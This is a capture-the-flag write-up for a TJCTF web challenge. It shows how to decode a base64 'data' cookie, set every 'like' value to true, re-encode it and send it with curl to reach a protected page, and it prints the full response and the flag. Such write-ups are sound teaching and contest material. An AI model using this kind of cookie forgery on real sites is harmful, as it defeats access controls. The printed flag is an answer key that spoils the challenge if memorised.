### Challenge

```
Sarah Palin Fanpage 35 points Web - Unsolved (466 solves)
Written by jpes707

Are you a true fan of Alaska's most famous governor? Visit the Sarah Palin fanpage.
```

### Solve

* It is a fan page which has the following pages
  - /About - wikipedia page of sarah palin
  - /Home  - has intro page 
  - /top10 - has 10 moments in a GIF and LIKE/UNLIKE button
  - /exclusive - is unauthorized unless 10 LIKES have been made

* Manually liking the moments is blocked at 5. ( clicking buttons is blocked )
* Easy intercept and alter should work but the domain containing underscores does not work good with burpsuite
* Use curl or tweak the JS code
* LIKE logic
  - the likes are transferred using base64 encoded string in cookie `data`

```
__cfduid=d9d23e47d15268c5aac5185687e925cbd1590120921; cf_clearance=c692c1eb8c4ec513c160682ea94bd12dc5f3d51b-1590442833-0-250; data=eyIxIjpmYWxzZSwiMiI6ZmFsc2UsIjMiOnRydWUsIjQiOmZhbHNlLCI1IjpmYWxzZSwiNiI6ZmFsc2UsIjciOnRydWUsIjgiOnRydWUsIjkiOnRydWUsIjEwIjp0cnVlfQ%3D%3D
```

```
echo `eyIxIjpmYWxzZSwiMiI6ZmFsc2UsIjMiOnRydWUsIjQiOmZhbHNlLCI1IjpmYWxzZSwiNiI6ZmFsc2UsIjciOnRydWUsIjgiOnRydWUsIjkiOnRydWUsIjEwIjp0cnVlfQ==` | base64 -d

{"1":false,"2":false,"3":true,"4":false,"5":false,"6":false,"7":true,"8":true,"9":true,"10":true}
```

* Encode the exploit payload
```
echo '{"1":true,"2":true,"3":true,"4":true,"5":true,"6":true,"7":true,"8":true,"9":true,"10":true}' | base64
eyIxIjp0cnVlLCIyIjp0cnVlLCIzIjp0cnVlLCI0Ijp0cnVlLCI1Ijp0cnVlLCI2Ijp0cnVlLCI3Ijp0cnVlLCI4Ijp0cnVlLCI5Ijp0cnVlLCIxMCI6dHJ1ZX0K
```

* Construct Curl
```
curl -v --cookie "__cfduid=d9d23e47d15268c5aac5185687e925cbd1590120921; cf_clearance=c692c1eb8c4ec513c160682ea94bd12dc5f3d51b-1590442833-0-250; data=eyIxIjp0cnVlLCIyIjp0cnVlLCIzIjp0cnVlLCI0Ijp0cnVlLCI1Ijp0cnVlLCI2Ijp0cnVlLCI3Ijp0cnVlLCI4Ijp0cnVlLCI5Ijp0cnVlLCIxMCI6dHJ1ZX0K" https://sarah_palin_fanpage.tjctf.org/exclusive
``` 

* Fire payload
```
curl -v --cookie "__cfduid=d9d23e47d15268c5aac5185687e925cbd1590120921; cf_clearance=c692c1eb8c4ec513c160682ea94bd12dc5f3d51b-1590442833-0-250; data=eyIxIjp0cnVlLCIyIjp0cnVlLCIzIjp0cnVlLCI0Ijp0cnVlLCI1Ijp0cnVlLCI2Ijp0cnVlLCI3Ijp0cnVlLCI4Ijp0cnVlLCI5Ijp0cnVlLCIxMCI6dHJ1ZX0K" https://sarah_palin_fanpage.tjctf.org/exclusive
*   Trying 104.27.143.197...
* TCP_NODELAY set
* Connected to sarah_palin_fanpage.tjctf.org (xx.xx.xx.xx) port 443 (#0)
* TLS 1.2 connection using TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
* Server certificate: sni.cloudflaressl.com
* Server certificate: CloudFlare Inc ECC CA-2
* Server certificate: Baltimore CyberTrust Root
> GET /exclusive HTTP/1.1
> Host: sarah_palin_fanpage.tjctf.org
> User-Agent: curl/7.55.1
> Accept: */*
> Cookie: __cfduid=d9d23e47d15268c5aac5185687e925cbd1590120921; cf_clearance=c692c1eb8c4ec513c160682ea94bd12dc5f3d51b-1590442833-0-250; data=eyIxIjp0cnVlLCIyIjp0cnVlLCIzIjp0cnVlLCI0Ijp0cnVlLCI1Ijp0cnVlLCI2Ijp0cnVlLCI3Ijp0cnVlLCI4Ijp0cnVlLCI5Ijp0cnVlLCIxMCI6dHJ1ZX0K
> 
< HTTP/1.1 200 OK
< Date: Mon, 25 May 2020 21:57:46 GMT
< Content-Type: text/html; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: Express
< CF-Cache-Status: DYNAMIC
< Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
< Server: cloudflare
< CF-RAY: 599283941bd6e37a-SEA
< cf-request-id: 02ef70908e0000e37aa420420000000
< 
    <head>
        <link rel="shortcut icon" href="media/favicon2.png">
        <link rel="stylesheet" type="text/css" href="stylesheets/style.css">
        <title>Sarah Palin fanpage</title>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    </head>

    <body>
        <div id="navbar"></div>
        <h1>Exclusive fanpage</h1>
        <h2>Access granted</h2>
        <p>You are a true Sarah Palin fan! The flag is tjctf{wkDd2Pi4rxiRaM5lOcLo979rru8MFqVHKdTqPBm4k3iQd8n0sWbBkOfuq9vDTGN9suZgYlH3jq6QTp3tG3EYapzsTHL7ycqRTP5Qf6rQSB33DcQaaqwQhpbuqPBm4k3iQd8n0sWbBkOf}.</p>
        <iframe width="800" height="450" src="https://www.youtube-nocookie.com/embed/GmhJXoQTvTA?autoplay=1" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </body>

* Connection #0 to host sarah_palin_fanpage.tjctf.org left intact
<script src="javascripts/navbar.js" id="exclusive"></script>
```

* Flag: tjctf{wkDd2Pi4rxiRaM5lOcLo979rru8MFqVHKdTqPBm4k3iQd8n0sWbBkOfuq9vDTGN9suZgYlH3jq6QTp3tG3EYapzsTHL7ycqRTP5Qf6rQSB33DcQaaqwQhpbuqPBm4k3iQd8n0sWbBkOf}
